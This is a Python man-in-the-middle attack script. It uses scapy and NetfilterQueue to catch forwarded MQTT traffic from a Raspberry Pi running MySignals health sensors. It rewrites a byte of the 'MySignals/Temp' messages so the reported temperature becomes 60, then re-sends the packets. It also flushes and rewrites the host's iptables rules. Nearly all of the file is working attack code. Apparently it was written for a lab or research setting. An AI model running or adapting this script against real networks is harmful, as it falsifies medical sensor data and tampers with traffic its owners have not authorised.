from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import os

TARGET_IP       =   '192.168.1.160'   # Raspberry Pi w/ MySignals
TOPIC           =   'MySignals/Temp'  # Target topic to modify


# -----------------------------------------------------------------------------
# Filter and Forward Packets
# -----------------------------------------------------------------------------
def pkt_handler(payload):
    # Convert to scapy packet
    data = payload.get_payload()
    pkt = scapy.IP(data)
    #pkt2 = scapy.Ether(data)
    #pkt.show()

    # Found topic in tcp payload
    if pkt.src == TARGET_IP:
        mqtt = str(pkt[scapy.TCP].payload)

        if TOPIC in mqtt:
            # Copy TCP and IP headers
            ip, tcp = cpy_tcp_ip(pkt)

            # Modify payload
            byte_payload = bytes(pkt[scapy.TCP].payload)
            list_payload = list(byte_payload)
            list_payload[len(list_payload)-2] = 60
            byte_payload = bytes(list_payload)

            new_payload = byte_payload

            # Replace pkt with new pkt
            new_pkt = ip / tcp / new_payload
            pkt = new_pkt

        # Drop packet and send new packet
        payload.drop()
        scapy.send(pkt)

    else:
        # Forward the packet along
        payload.accept()

# -----------------------------------------------------------------------------
# Copy TCP and IP headers
# -----------------------------------------------------------------------------
def cpy_tcp_ip(pkt):

    cpy_ip = scapy.IP(
        version=pkt[scapy.IP].version,
        ihl=pkt[scapy.IP].ihl,
        tos=pkt[scapy.IP].tos,
        len=pkt[scapy.IP].len,
        id=pkt[scapy.IP].id,
        flags=pkt[scapy.IP].flags,
        frag=pkt[scapy.IP].frag,
        ttl=pkt[scapy.IP].ttl,
        proto=pkt[scapy.IP].proto,
        src=pkt[scapy.IP].src,
        dst=pkt[scapy.IP].dst
    )

    cpy_tcp = scapy.TCP(
        sport=pkt[scapy.TCP].sport,
        dport=pkt[scapy.TCP].dport,
        seq=pkt[scapy.TCP].seq,
        ack=pkt[scapy.TCP].ack,
        dataofs=pkt[scapy.TCP].dataofs,
        reserved=pkt[scapy.TCP].reserved,
        flags=pkt[scapy.TCP].flags,
        window=pkt[scapy.TCP].window,
        urgptr=pkt[scapy.TCP].urgptr,
        options=pkt[scapy.TCP].options
    )

    return cpy_ip, cpy_tcp

# Default Tables
#  -P INPUT ACCEPT
#  -P FORWARD ACCEPT
#  -P OUTPUT ACCEPT

# -----------------------------------------------------------------------------
# Main
# Should be run with mitm.py
# -----------------------------------------------------------------------------
def main():

    # Save iptables rules for restore afterwards
    print('[*] Saving iptables')
    os.popen("iptables-save > iptables.save")

    print('[*] Flushing iptables')
    os.popen('iptables -F')
    os.popen('iptables -X')

    # Set rules and forwarding
    print('[*] Adding nfqueue rules')
    os.popen("iptables -A FORWARD -j NFQUEUE --queue-num 1")

    # Start the nfqueue
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, pkt_handler)

    try:
        # Main loop
        print('[*] Running attack')
        nfqueue.run()
    except KeyboardInterrupt:
        # End the nfqueue
        print()
        print("[*] Attack finished")
        nfqueue.unbind()

    # Restore IP tables
    print("[*] Restoring iptables")
    os.popen('iptables -F')
    os.popen('iptables -X')
    os.popen("iptables-restore < iptables.save")

# -----------------------------------------------------------------------------
#
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    main()